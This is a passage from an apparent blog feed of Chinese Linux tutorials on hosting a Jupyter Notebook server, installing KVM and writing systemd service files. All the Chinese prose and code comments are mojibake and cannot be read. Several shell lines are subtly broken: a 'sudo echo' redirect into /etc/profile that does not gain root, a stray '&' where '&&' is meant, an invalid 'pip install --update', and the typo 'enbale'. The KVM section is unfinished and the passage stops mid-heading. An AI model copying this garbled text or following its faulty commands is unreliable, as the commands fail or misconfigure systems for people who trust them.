class="hljs-comment"># æ·»åŠ ç¯å¢ƒå˜é‡(ézshç”¨æˆ·)ï¼Œè‹¥ä½ æ­£åœ¨ä½¿ç”¨zshè¯·å°†/etc/profileæ›¿æ¢ä¸º~/.zshrc</span><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;export PATH=<span class="hljs-variable">$PATH</span>:/home/<span class="hljs-variable">$USER</span>/miniconda3/bin&quot;</span> &gt;&gt; /etc/profile &amp; <span class="hljs-built_in">source</span> /etc/profile</code></pre><p>å®Œæˆminiconda3çš„å®‰è£…ä¹‹åï¼Œéœ€è¦ä½¿ç”¨<code>update-alternatives</code>é…ç½®<strong>å¤šç‰ˆæœ¬Python</strong>çš„ä¼˜å…ˆçº§ï¼Œå°†condaçš„python3.8è®¾ä¸ºé»˜è®¤pythonï¼š</p><pre><code class="hljs bash"><span class="hljs-comment"># æŸ¥çœ‹æ˜¯å¦å·²ç»å»ºç«‹äº†pythonçš„alternativeç®¡ç†ï¼Œè‹¥æ— åˆ™åˆ›å»º</span><span class="hljs-built_in">sudo</span> update-alternatives --config python<span class="hljs-comment"># ä¾æ¬¡åˆ›å»ºè‡ªå¸¦python2ï¼Œpython3ä»¥åŠminiconda3çš„python3çš„alternativesç®¡ç†ï¼Œæœ€åçš„æ•°å­—ä¸ºä¼˜å…ˆçº§ï¼Œè¶Šå¤§è¶Šé«˜</span><span class="hljs-built_in">sudo</span> update-alternatives --install /usr/bin/python python /usr/bin/python2.7 1<span class="hljs-built_in">sudo</span> update-alternatives --install /usr/bin/python python /usr/bin/python3.6 2<span class="hljs-built_in">sudo</span> update-alternatives --install /usr/bin/python python /home/<span class="hljs-variable">$USER</span>/miniconda3/bin/python3 3</code></pre><h3 id="1-2-å®‰è£…Jupyter"><a href="#1-2-å®‰è£…Jupyter" class="headerlink" title="1.2 å®‰è£…Jupyter"></a>1.2 å®‰è£…Jupyter</h3><p>åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥<code>python -V</code>å’Œ<code>pip -V</code> ç¡®è®¤èƒ½å¤Ÿçœ‹åˆ°æ­£åœ¨ä½¿ç”¨miniconda3çš„pythonå’Œpip</p><pre><code class="hljs bash"><span class="hljs-comment"># pipæ¢å›½å†…æºä»¥æé€Ÿï¼Œåœ¨~/.pip/pip.confä¸­æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼Œæ–‡ä»¶ä¸å­˜åœ¨åˆ™åˆ›å»º</span>[global]index-url = https://pypi.tuna.tsinghua.edu.cn/simple<span class="hljs-comment"># å®‰è£…jupyter</span>pip install jupyter</code></pre><h2 id="2-é…ç½®Jupyter-Notebook"><a href="#2-é…ç½®Jupyter-Notebook" class="headerlink" title="2 é…ç½®Jupyter-Notebook"></a>2 é…ç½®Jupyter-Notebook</h2><h3 id="2-1-é…ç½®ç™»é™†å¯†ç "><a href="#2-1-é…ç½®ç™»é™†å¯†ç " class="headerlink" title="2.1 é…ç½®ç™»é™†å¯†ç "></a>2.1 é…ç½®ç™»é™†å¯†ç </h3><p>ä¸ºäº†ä¿éšœè¿œç¨‹è®¿é—®äº‘æœåŠ¡å™¨JupyteræœåŠ¡çš„å®‰å…¨æ€§ï¼Œæˆ‘ä»¬éœ€è¦ä¸ºnotebookè®¾å®šå¯†ç ã€‚ï¼ˆè¯¥å¯†ç ä¼šåœ¨ç™»é™†JupyteræœåŠ¡æ—¶è¦æ±‚ç”¨æˆ·è¾“å…¥ï¼Œè‹¥ä¸æœåŠ¡å™¨ä¸Šå­˜å‚¨çš„hashå€¼åŒ¹é…åˆ™æ”¾è¡Œï¼‰</p><p>ä»¥ä¸‹æ˜¯å€ŸåŠ©<code>IPython.lib</code>ä¸­çš„<code>passwd</code>å‡½æ•°æ¥ç”Ÿæˆå¯†ç çš„sha1 codeï¼š</p><pre><code class="hljs ipython">Python <span class="hljs-number">3.8</span><span class="hljs-number">.5</span> (default, Sep  <span class="hljs-number">4</span> <span class="hljs-number">2020</span>, 07:<span class="hljs-number">30</span>:<span class="hljs-number">14</span>)[GCC <span class="hljs-number">7.3</span><span class="hljs-number">.0</span>] :: Anaconda, Inc. on linux<span class="hljs-type">Type</span> <span class="hljs-string">&quot;help&quot;</span>, <span class="hljs-string">&quot;copyright&quot;</span>, <span class="hljs-string">&quot;credits&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;license&quot;</span> <span class="hljs-keyword">for</span> more information.<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> IPython.lib <span class="hljs-keyword">import</span> passwd<span class="hljs-meta">&gt;&gt;&gt; </span>passwd()Enter password:Verify password:<span class="hljs-string">&#x27;sha1:..............YOUR-HASH-CODE....................&#x27;</span>&gt;&gt;&gt;</code></pre><h3 id="2-2-ç”Ÿæˆé…ç½®æ–‡ä»¶"><a href="#2-2-ç”Ÿæˆé…ç½®æ–‡ä»¶" class="headerlink" title="2.2 ç”Ÿæˆé…ç½®æ–‡ä»¶"></a>2.2 ç”Ÿæˆé…ç½®æ–‡ä»¶</h3><pre><code class="hljs bash"><span class="hljs-comment"># ç”Ÿæˆ /home/$USER/.jupyter/jupyter_notebook_config.py é…ç½®æ–‡ä»¶</span>jupyter notebook --generate-config</code></pre><p>ç”±äºè¯¥é…ç½®æ–‡æ¡£çš„æ‰€æœ‰å†…å®¹å‡é»˜è®¤æ³¨é‡Šï¼Œå› æ­¤å¯ä»¥æŠŠæˆ‘ä»¬è‡ªå·±çš„é…ç½®é›†ä¸­è¿½åŠ åˆ°æ–‡å°¾ï¼š</p><pre><code class="hljs python"><span class="hljs-comment">#--------------------------------------------------------------------------</span><span class="hljs-comment"># User configuration</span><span class="hljs-comment">#--------------------------------------------------------------------------</span>c.NotebookApp.ip = <span class="hljs-string">&#x27;*&#x27;</span>                               <span class="hljs-comment"># notebookç›‘å¬çš„IP</span>c.NotebookApp.port = <span class="hljs-number">8888</span>                               <span class="hljs-comment"># notebookç›‘å¬çš„ç«¯å£</span>c.NotebookApp.notebook_dir = <span class="hljs-string">&#x27;/path/to/project-dirs&#x27;</span> <span class="hljs-comment"># notebookçš„å·¥ä½œç›®å½•</span>c.NotebookApp.open_browser = <span class="hljs-literal">False</span>                   <span class="hljs-comment"># è¿è¡ŒnotebookæœåŠ¡æ—¶ä¸æ‰“å¼€æµè§ˆå™¨</span>c.NotebookApp.password = <span class="hljs-string">u&#x27;sha1:c63cf.....45b09bed&#x27;</span>  <span class="hljs-comment"># å¯†ç çš„hash å€¼</span></code></pre> <div class="note note-warning">            <p><strong>æ³¨æ„</strong>ï¼šnotebook_dirå³ä¸ºnotebookçš„<code>/</code>ï¼Œå› æ­¤ä¸ºäº†ä¿è¯å®‰å…¨æ€§ï¼Œè¯·å°†notebookçš„å·¥ä½œç›®å½•è®¾ä¸ºéé‡è¦ç›®å½•ï¼Œå¦‚ä½ å¯ä»¥åˆ›å»ºä¸€ä¸ª<code>~/jupyter-projects</code></p>          </div> <p>å®Œæˆé…ç½®ä¹‹åå¯ä»¥å¯åŠ¨notebookå¹¶è®¿é—®å•¦ï¼š</p><pre><code class="hljs bash"><span class="hljs-comment"># ä½¿ç”¨jupyter-notebookä¹Ÿæ˜¯ä¸€æ ·çš„</span>jupyter notebook<span class="hljs-comment"># æˆ–è€…æ›´ä¼˜é›…ä¸€ç‚¹</span><span class="hljs-built_in">nohup</span> jupyter notebook &gt;&gt; ~/.notebook.log 2&gt;&amp;1 &amp;</code></pre> <div class="note note-warning">            <p><strong>æ³¨æ„</strong>ï¼šè®°å¾—åœ¨äº‘æœåŠ¡å™¨æ§åˆ¶å°çš„å®‰å…¨ç»„ä¸­é…ç½®è§„åˆ™æ”¾è¡Œnotebookç›‘å¬çš„<code>8888</code>ç«¯å£</p>          </div> <h3 id="2-3-æ’°å†™systemdæœåŠ¡è„šæœ¬"><a href="#2-3-æ’°å†™systemdæœåŠ¡è„šæœ¬" class="headerlink" title="2.3 æ’°å†™systemdæœåŠ¡è„šæœ¬"></a>2.3 æ’°å†™systemdæœåŠ¡è„šæœ¬</h3><p>å°†ä»¥ä¸‹å†…å®¹å†™å…¥<code>/usr/lib/systemd/system/notebook.service</code>ï¼Œè‹¥ç›®å½•ä¸å­˜åœ¨åˆ™æ‰‹åŠ¨åˆ›å»º</p><pre><code class="hljs shell">[Unit]Description=My notebook serviceAfter=network.target[Service]<span class="hljs-meta prompt_">#</span><span class="language-bash">Type=simple  <span class="hljs-comment"># default simple</span></span>User=qgrainGroup=qgrainExecStart=/home/qgrain/miniconda3/bin/jupyter-notebookRestart=on-failureRestartSec=10s[Install]WantedBy=multi-user.target</code></pre><p>ç„¶åé…ç½®<code>notebook.service</code>è‡ªå¯åŠ¨</p><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">enable</span> notebook<span class="hljs-built_in">sudo</span> systemctl [start|stop|restart|status] notebook</code></pre><h2 id="3-ä¸»é¢˜ç¾åŒ–â­"><a href="#3-ä¸»é¢˜ç¾åŒ–â­" class="headerlink" title="3 ä¸»é¢˜ç¾åŒ–â­"></a>3 ä¸»é¢˜ç¾åŒ–â­</h2><h3 id="3-1-å®‰è£…jupyter-themes"><a href="#3-1-å®‰è£…jupyter-themes" class="headerlink" title="3.1 å®‰è£…jupyter-themes"></a>3.1 å®‰è£…jupyter-themes</h3><p>å‚è€ƒ<a href="https://github.com/dunovank/jupyter-themes">Gitå¼€æºé¡¹ç›®ï¼šjupyter-themes</a></p><pre><code class="hljs bash"><span class="hljs-comment"># å®‰è£…jupyter-themes</span>pip install jupyter-themes<span class="hljs-comment"># æ›´æ–°jupyter-themesè‡³latest</span>pip install --update jupyter-themes</code></pre><h3 id="3-2-é…ç½®ä¸»é¢˜"><a href="#3-2-é…ç½®ä¸»é¢˜" class="headerlink" title="3.2 é…ç½®ä¸»é¢˜"></a>3.2 é…ç½®ä¸»é¢˜</h3><p><code>jupyter-themes</code>æœ‰ä»¥ä¸‹å‡ æ¡å…³é”®å‘½ä»¤ï¼Œå…·ä½“Usageè¯·è§å…¶gitä»“åº“çš„READMEï¼š</p><pre><code class="hljs bash"><span class="hljs-comment"># æŸ¥çœ‹æ‰€æœ‰ä¸»é¢˜</span>jt -l<span class="hljs-comment"># å°†ä¸»é¢˜é…ç½®ä¸ºmonokai</span>jt -t monokai<span class="hljs-comment"># æˆ‘çš„é…ç½®å‘½ä»¤å¦‚ä¸‹ï¼Œè¿™æ ·çš„notebookç•Œé¢æå…¶èˆ’é€‚ ãƒ¾(Â´â–½ï½€)</span>jt -t monokai -f roboto -fs 12 -nfs 14 -tfs 13 -ofs 11 -dfs 10 -cellw 66% -T -N -kl</code></pre> <div class="note note-info">            <p>å…¶ä¸­<strong>å‚æ•°å«ä¹‰</strong>ä¾æ¬¡ä¸ºè®¾ç½®ä¸»é¢˜ä¸º<code>monokai</code>ï¼Œè®¾ç½®ä»£ç å­—ä½“ä¸º<code>roboto</code>ï¼Œè®¾ç½®ä»£ç å­—å·ä¸º<code>12</code>ï¼Œè®¾ç½®notebookå­—å·ä¸º<code>14</code>ï¼Œè®¾ç½®æ–‡æœ¬/Markdownå­—å·ä¸º<code>13</code>ï¼Œè®¾ç½®è¾“å‡ºå­—å·ä¸º<code>11</code>ï¼Œè®¾ç½®Pandas Dataframeå­—å·ä¸º<code>10</code>ï¼Œè®¾ç½®cellå®½åº¦ä¸ºå±å¹•çš„<code>66%</code>ï¼Œè®¾ç½®<code>Toolbarå¯è§</code>ï¼Œè®¾ç½®<code>Name&amp;Logoå¯è§</code>ä»¥åŠè®¾ç½®<code>Kernel Logoå¯è§</code></p>          </div> <p>å…·ä½“ç•Œé¢æ•ˆæœå¦‚ä¸‹ï¼ˆå½“ç„¶ï¼Œpasswdæˆ‘ä¸ºäº†æµ‹è¯•ï¼Œè¾“å…¥çš„æ˜¯123ï¼‰ï¼š</p><p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202210061313149.png" alt=""></p><h2 id="4-å‚è€ƒ"><a href="#4-å‚è€ƒ" class="headerlink" title="4 å‚è€ƒ"></a>4 å‚è€ƒ</h2><p><a href="https://bitmingw.com/2017/07/09/run-jupyter-notebook-server/">[1] Mingâ€™s Blog | æ­å»º ipython/jupyter notebook æœåŠ¡å™¨</a></p><p><a href="https://qgrain.github.io/2020/05/12/%E7%BC%96%E5%86%99systemd%E6%9C%8D%E5%8A%A1%E8%84%9A%E6%9C%AC/">[2] Zhiyuâ€™s Blog | ç¼–å†™systemdæœåŠ¡è„šæœ¬ </a></p><p><a href="https://zhuanlan.zhihu.com/p/46242116">[3] çŸ¥ä¹ |ã€å†…å®¹å¼•èµ·èˆ’é€‚ã€‘è®©ä½ çš„Jupyter Notebookä¸å†è¾£çœ¼ç›</a></p>]]></content>
    
    
    <categories>
      
      <category>Tutorial</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Selfhosted</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>KVMçš„å®‰è£…ä¸ä½¿ç”¨</title>
    <link href="/2020/05/25/KVM%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    <url>/2020/05/25/KVM%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p> åŸºäºå†…æ ¸çš„è™šæ‹Ÿæœºï¼ˆKernel-based Virtual Machineï¼Œç®€ç§°KVMï¼‰ï¼Œæ˜¯ä¸€ç§ç”¨äºLinuxå†…æ ¸ä¸­çš„è™šæ‹ŸåŒ–åŸºç¡€è®¾æ–½ã€‚KVMç›®å‰æ”¯æŒIntel VTåŠAMD-Vçš„åŸç”Ÿè™šæ‹ŸæŠ€æœ¯ </p><span id="more"></span><h2 id="1-KVMç®€ä»‹"><a href="#1-KVMç®€ä»‹" class="headerlink" title="1 KVMç®€ä»‹"></a>1 KVMç®€ä»‹</h2><ul><li><p><strong>ä¸€äº›æ¦‚å¿µ</strong>ï¼š</p><ul><li>æ˜¯x86æ¶æ„ä¸”ç¡¬ä»¶æ”¯æŒè™šæ‹ŸåŒ–æŠ€æœ¯ï¼ˆå¦‚ intel VT æˆ– AMD-Vï¼‰çš„Linuxå…¨è™šæ‹ŸåŒ–è§£å†³æ–¹æ¡ˆ</li><li>å®ƒåŒ…å«ä¸€ä¸ªä¸ºå¤„ç†å™¨æä¾›åº•å±‚è™šæ‹ŸåŒ– å¯åŠ è½½çš„æ ¸å¿ƒæ¨¡å—kvm.koï¼ˆkvm-intel.koæˆ–kvm-AMD.koï¼‰ </li><li>KVMè¿˜éœ€è¦ä¸€ä¸ªç»è¿‡ä¿®æ”¹çš„QEMUè½¯ä»¶ï¼ˆqemu-kvmï¼‰ï¼Œä½œä¸ºè™šæ‹Ÿæœºä¸Šå±‚æ§åˆ¶å’Œç•Œé¢ </li><li>åœ¨ä¸»æµçš„Linuxå†…æ ¸ï¼Œå¦‚2.6.20ä»¥ä¸Šçš„å†…æ ¸å‡å·²åŒ…å«äº†KVMæ ¸å¿ƒ</li></ul></li><li><p><strong>QEMU-KVM</strong>ï¼š</p><ul><li>åœ¨Linuxç³»ç»Ÿä¸­ï¼Œä»…åŠ è½½äº†KVMå†…æ ¸æ¨¡å—æ˜¯ä¸å¤Ÿçš„ï¼Œç”¨æˆ·æ— æ³•ç›´æ¥æ§åˆ¶å†…æ ¸æ¨¡å—å»åšäº‹æƒ…ï¼Œè¿˜å¿…é¡»æœ‰ä¸€ä¸ªç”¨æˆ·ç©ºé—´çš„å·¥å…·ã€‚å› æ­¤KVMçš„å¼€å‘è€…é€‰æ‹©äº†å·²æˆå‹çš„å¼€æºè™šæ‹ŸåŒ–è½¯ä»¶QEMUï¼Œå½¢æˆå¯æ§åˆ¶KVMå†…æ ¸æ¨¡å—çš„ç”¨æˆ·ç©ºé—´å·¥å…·QEMU-KVM</li></ul></li><li><strong>libvirt</strong>ï¼š<ul><li>Libvirt æ˜¯ä¸€å¥—æä¾›äº†å¤šç§è¯­è¨€æ¥å£çš„APIï¼Œä¸ºå„ç§è™šæ‹ŸåŒ–å·¥å…·æä¾›ä¸€å¥—æ–¹ä¾¿å¯é çš„ç¼–ç¨‹æ¥å£ï¼Œä¸ä»…æ”¯æŒ KVMï¼Œè€Œä¸”æ”¯æŒ Xen ç­‰å…¶ä»–è™šæ‹Ÿæœºã€‚Libvirt ä¸ä»…æä¾›äº† APIï¼Œè¿˜è‡ªå¸¦ä¸€å¥—åŸºäºæ–‡æœ¬çš„ç®¡ç†è™šæ‹Ÿæœºçš„å‘½ä»¤ virshï¼Œå¯é€šè¿‡ä½¿ç”¨ virsh å‘½ä»¤æ¥ä½¿ç”¨ libvirt çš„å…¨éƒ¨åŠŸèƒ½</li></ul></li></ul><h2 id="2-KVMå®‰è£…"><a href="#2-KVMå®‰è£…" class="headerlink" title="2 KVMå®‰è£…"></a>2 KVMå®‰è£…</h2><h3 id="2-1-æ£€æŸ¥è™šæ‹ŸåŒ–æ”¯æŒ"><a href="#2-1-æ£€æŸ¥è™šæ‹ŸåŒ–æ”¯æŒ" class="headerlink" title="2.1 æ£€æŸ¥è™šæ‹ŸåŒ–æ”¯æŒ"></a>2.1 æ£€æŸ¥è™šæ‹ŸåŒ–æ”¯æŒ</h3><p>KVMæ˜¯é¢å‘å…·å¤‡<code>Intel VT</code>å’Œ<code>AMD-V</code>è™šæ‹ŸåŒ–ç¡¬ä»¶çš„æŠ€æœ¯ï¼Œå› æ­¤é¦–å…ˆéœ€è¦checkä½ çš„ç³»ç»Ÿæ˜¯å¦æ”¯æŒè™šæ‹ŸåŒ–ï¼š</p><pre><code class="hljs bash">egrep <span class="hljs-string">&#x27;(vmx|svm)&#x27;</span> /proc/cpuinfo</code></pre><p>èƒ½çœ‹åˆ°<code>flag *******</code>çš„è¾“å‡ºå³è¡¨æ˜æ”¯æŒè™šæ‹ŸåŒ–ï¼Œå…¶ä¸­vmxå¯¹åº”Inter VTï¼Œsvmå¯¹åº”ADM-V</p><h3 id="2-2-å®‰è£…ç›¸å…³è½¯ä»¶åŒ…"><a href="#2-2-å®‰è£…ç›¸å…³è½¯ä»¶åŒ…" class="headerlink" title="2.2 å®‰è£…ç›¸å…³è½¯ä»¶åŒ…"></a>2.2 å®‰è£…ç›¸å…³è½¯ä»¶åŒ…</h3><p>ç†è®ºä¸ŠKVMçš„æœ€å°å®‰è£…å°±æ˜¯<code>qemu-kvm</code>å’Œ<code>virtinst</code>ï¼Œä½†è€ƒè™‘åˆ°ç®¡ç†ä¸Šçš„ä¾¿æ·æ€§ï¼Œæˆ‘ä»¬éœ€è¦libvirt-daemonä½œä¸ºå®ˆæŠ¤è¿›ç¨‹å’Œvirt-managerçš„GUIç®¡ç†ç•Œé¢ï¼Œä»¥åŠ<code>brctl</code>ï¼š</p><pre><code class="hljs bash"><span class="hljs-comment"># æ›´æ–°é•œåƒæºï¼ˆå¦‚æœæœ‰å¿…è¦ï¼‰</span><span class="hljs-built_in">sudo</span> apt-get update<span class="hljs-comment"># å®‰è£…ç›¸å…³è½¯ä»¶åŒ…</span><span class="hljs-built_in">sudo</span> apt install qemu qemu-kvm virtinst virt-manager bridge-utils</code></pre><p>ç®¡ç†<code>libvirtd.service</code></p><pre><code class="hljs bash"><span class="hljs-comment"># systemdç®¡ç†</span><span class="hljs-built_in">sudo</span> systemctl [start|stop|restart|enbale|<span class="hljs-built_in">disable</span>|status] libvirtd</code></pre><h2 id="3-KVMä½¿ç”¨"><a href="#3-KVMä½¿ç”¨" class="headerlink" title="3 KVMä½¿ç”¨"></a>3 KVMä½¿ç”¨</h2> <div class="note note-primary">            <p>æ‰€æœ‰çš„KVMçš„ç®¡ç†éƒ½å¯ä»¥ä»<code>virt-manager</code>å›¾å½¢åŒ–ç•Œé¢æ¥æ“ä½œï¼Œå› æ­¤ä¸‹é¢ä¸»è¦ä»‹ç»å‘½ä»¤è¡Œæ¥å£</p>          </div> <h3 id="3-1-åˆ›å»ºKVMè™šæ‹Ÿæœº"><a href="#3-1-åˆ›å»ºKVMè™šæ‹Ÿæœº" class="headerlink" title="3.1 åˆ›å»ºKVMè™šæ‹Ÿæœº"></a>3.1 åˆ›å»ºKVMè™šæ‹Ÿæœº</h3><h3 id="3-2-ç®¡ç†KVMè™šæ‹Ÿæœº"><a href="#3-2-ç®¡ç†KVMè™šæ‹Ÿæœº" class="headerlink" title="3.2 ç®¡ç†KVMè™šæ‹Ÿæœº"></a>3.2 ç®¡ç†KVMè™šæ‹Ÿæœº</h3><h3 id="3-3-é…ç½®è™šæ‹Ÿæœºç½‘ç»œ"><a href="#3-3-é…ç½®è™šæ‹Ÿæœºç½‘ç»œ" class="headerlink" title="3.3 é…ç½®è™šæ‹Ÿæœºç½‘ç»œ"></a>3.3 é…ç½®è™šæ‹Ÿæœºç½‘ç»œ</h3> <div class="note note-danger">            <p>To be completedâ€¦ : )</p>          </div> <h2 id="4-å‚è€ƒ"><a href="#4-å‚è€ƒ" class="headerlink" title="4 å‚è€ƒ"></a>4 å‚è€ƒ</h2><p><a href="https://zh.wikipedia.org/zh-hans/%E5%9F%BA%E4%BA%8E%E5%86%85%E6%A0%B8%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA">[1] åŸºäºå†…æ ¸çš„è™šæ‹Ÿæœº(KVM) ç»´åŸºç™¾ç§‘</a></p><p><a href="https://my.oschina.net/u/2343310/blog/1498463">[2] kvm è™šæ‹ŸåŒ–æ¦‚è¿°åŠ virt-manager å®‰è£…è™šæ‹Ÿæœº</a></p><p><a href="https://it.ismy.fun/2018/09/18/debian-9-kvm/">[3] Debian 9 å®‰è£… KVM è™šæ‹Ÿæœº</a></p>]]></content>
    
    
    <categories>
      
      <category>Tutorial</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Virtualization</tag>
      
      <tag>KVM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¼–å†™systemdæœåŠ¡è„šæœ¬</title>
    <link href="/2020/05/12/%E7%BC%96%E5%86%99systemd%E6%9C%8D%E5%8A%A1%E8%84%9A%E6%9C%AC/"/>
    <url>/2020/05/12/%E7%BC%96%E5%86%99systemd%E6%9C%8D%E5%8A%A1%E8%84%9A%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¼–å†™systemdæœåŠ¡è„šæœ¬"><a href="#ç¼–å†™systemdæœåŠ¡è„šæœ¬" class="headerlink" title="ç¼–å†™systemdæœåŠ¡è„šæœ¬"></a>ç¼–å†™systemdæœåŠ¡è„šæœ¬</h1><p>å¦‚ä½•ç¼–å†™systemdæœåŠ¡è„šæœ¬æ¥å®ç°æœåŠ¡çš„è‡ªå¯åŠ¨ï¼Œå¯åŠ¨ï¼Œåœæ­¢å’Œé‡å¯ç®¡ç†</p><span id="more"></span><h2 id="1-èƒŒæ™¯ä»‹ç»"><a href="#1-èƒŒæ™¯ä»‹ç»" class="headerlink" title="1 èƒŒæ™¯ä»‹ç»"></a>1 èƒŒæ™¯ä»‹ç»</h2><ul><li><p>RHEL6/CentOS6é‡‡ç”¨<code>/etc/init.d/xxx</code>è„šæœ¬è¿›è¡ŒæœåŠ¡ç®¡ç†ï¼Œä½†æ˜¯7+ç‰ˆæœ¬ä¹‹åç”±initç®¡ç†å‡çº§ä¸ºäº†ç”±systemdç®¡ç†ï¼Œç›¸åº”åœ°æœåŠ¡ç®¡ç†æ–¹å¼ä¹Ÿå˜æ›´ä¸ºç”±systemctlç®¡ç†çš„service</p></li><li><p>RHEL7/CentOS7çš„<code>/etc/rc.d/rc.local</code>å»ºè®®åˆ›å»ºè‡ªå·±çš„systemdæœåŠ¡æˆ–udevè§„åˆ™æ¥è¿›è¡Œå¼€æœºè‡ªå¯è„šæœ¬ç®¡ç†ï¼Œå»ºè®®å¦‚ä¸‹ï¼š</p></li></ul><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><span class="hljs-comment"># THIS FILE IS ADDED FOR COMPATIBILITY PURPOSES</span><span class="hljs-comment">#</span><span class="hljs-comment"># It is highly advisable to create own systemd services or udev rules</span><span class="hljs-comment"># to run scripts during boot instead of using this file.</span><span class="hljs-comment">#</span><span class="hljs-comment"># In contrast to previous versions due to parallel execution during boot</span><span class="hljs-comment"># this script will NOT be run after all other services.</span><span class="hljs-comment">#</span><span class="hljs-comment"># Please note that you must run &#x27;chmod +x /etc/rc.d/rc.local&#x27; to ensure</span><span class="hljs-comment"># that this script will be executed during boot.</span></code></pre><ul><li>å› æ­¤æˆ‘ä»¬åº”è¯¥é¡ºåº”æ—¶ä»£(å·¥å…·)çš„å˜è¿ï¼Œå­¦ä¹ systemdçš„ç”¨æ³•ğŸ•</li></ul><p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/master/figure/bg2016030703.png"/></p><h2 id="2-æœåŠ¡è„šæœ¬å†™æ³•"><a href="#2-æœåŠ¡è„šæœ¬å†™æ³•" class="headerlink" title="2 æœåŠ¡è„šæœ¬å†™æ³•"></a>2 æœåŠ¡è„šæœ¬å†™æ³•</h2><ul><li>CentOS7çš„serviceè„šæœ¬ä¸€èˆ¬å­˜æ”¾åœ¨<code>/etc/systemd/</code>, <code>/usr/lib/systemd</code>è·¯å¾„ä¸‹ï¼Œå‰è€…åŒ…å«ç€å¤šä¸ª<code>*.target.wants</code>å¦‚<code>multi-user.target.wants</code>ç­‰ï¼›è€Œåè€…ä¸ºå®‰è£…è½¯ä»¶ç”Ÿæˆserviceçš„ç›®å½•ï¼Œä¸€èˆ¬ç¼–å†™è‡ªå·±çš„serviceå¯ä»¥æ”¾åœ¨æ­¤ç›®å½•ä¸‹ã€‚ç›®å½•ä¸‹åˆæœ‰<strong>system</strong>å’Œ<strong>user</strong>ä¹‹åˆ†ï¼š<ul><li><strong>/usr/lib/systemd/system/</strong>ï¼Œç³»ç»ŸæœåŠ¡ï¼Œå¼€æœºä¸éœ€è¦ç”¨æˆ·ç™»å½•å³å¯è¿è¡Œçš„æœåŠ¡</li><li><strong>/usr/lib/system/user/</strong>ï¼Œç”¨æˆ·æœåŠ¡ï¼Œéœ€è¦ç”¨æˆ·ç™»å½•åæ‰èƒ½è¿è¡Œçš„æœåŠ¡</li></ul></li><li>æ¯ä¸€ä¸ªæœåŠ¡è„šæœ¬æ–‡ä»¶ä»¥.serviceç»“å°¾ï¼Œç”±ä¸‰ä¸ªåŒºå—ç»„æˆ: [Unit], [Service]å’Œ[Install]ï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªç¼–å†™æ ·ä¾‹ï¼š</li></ul><pre><code class="hljs service">[Unit]   Description=test           # ç®€å•æè¿°æœåŠ¡After=network.target    # æè¿°æœåŠ¡ç±»åˆ«ï¼Œè¡¨ç¤ºæœ¬æœåŠ¡éœ€è¦åœ¨networkæœåŠ¡å¯åŠ¨ååœ¨å¯åŠ¨Before=xxx.service      # è¡¨ç¤ºéœ€è¦åœ¨æŸäº›æœåŠ¡å¯åŠ¨ä¹‹å‰å¯åŠ¨ï¼ŒAfterå’ŒBeforeå­—æ®µåªæ¶‰åŠå¯åŠ¨é¡ºåºï¼Œä¸æ¶‰åŠä¾èµ–å…³ç³»ã€‚[Service] Type=forking             # è®¾ç½®æœåŠ¡çš„å¯åŠ¨æ–¹å¼User=USER                # è®¾ç½®æœåŠ¡è¿è¡Œçš„ç”¨æˆ·Group=USER               # è®¾ç½®æœåŠ¡è¿è¡Œçš„ç”¨æˆ·ç»„WorkingDirectory=/PATH    # è®¾ç½®æœåŠ¡è¿è¡Œçš„è·¯å¾„(cwd)KillMode=control-group  # å®šä¹‰systemdå¦‚ä½•åœæ­¢æœåŠ¡Restart=no                # å®šä¹‰æœåŠ¡è¿›ç¨‹é€€å‡ºåï¼Œsystemdçš„é‡å¯æ–¹å¼ï¼Œé»˜è®¤æ˜¯ä¸é‡å¯ExecStart=/start.sh        # æœåŠ¡å¯åŠ¨å‘½ä»¤ï¼Œå‘½ä»¤éœ€è¦ç»å¯¹è·¯å¾„ï¼ˆé‡‡ç”¨shè„šæœ¬å¯åŠ¨å…¶ä»–è¿›ç¨‹æ—¶Typeé¡»ä¸ºforkingï¼‰   [Install]   WantedBy=multi-user.target  # å¤šç”¨æˆ·</code></pre><ul><li>å®Œæˆserviceè„šæœ¬ç¼–å†™åï¼Œéœ€è¦æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ä»¥é‡è½½ç”Ÿæ•ˆï¼š</li></ul><pre><code class="hljs bash"><span class="hljs-comment"># é‡æ–°åŠ è½½æ‰€æœ‰çš„systemdæœåŠ¡</span><span class="hljs-built_in">sudo</span> systemctl daemon-reload<span class="hljs-comment"># ç®¡ç†æœåŠ¡ [ä½¿èƒ½å¼€å¯å¯åŠ¨|å¯åŠ¨|åœæ­¢|é‡å¯|æŸ¥çœ‹çŠ¶æ€]</span><span class="hljs-built_in">sudo</span> systemctl [<span class="hljs-built_in">enable</span>|start|stop|restart|status] xxx.service</code></pre><h2 id="3-åŒºå—å‚æ•°è§£é‡Š"><a href="#3-åŒºå—å‚æ•°è§£é‡Š" class="headerlink" title="3 åŒºå—å‚æ•°è§£é‡Š"></a>3 åŒºå—å‚æ•°è§£é‡Š</h2><h3 id="Unit-åŒºå—ï¼šå¯åŠ¨é¡ºåºä¸ä¾èµ–å…³ç³»"><a href="#Unit-åŒºå—ï¼šå¯åŠ¨é¡ºåºä¸ä¾èµ–å…³ç³»" class="headerlink" 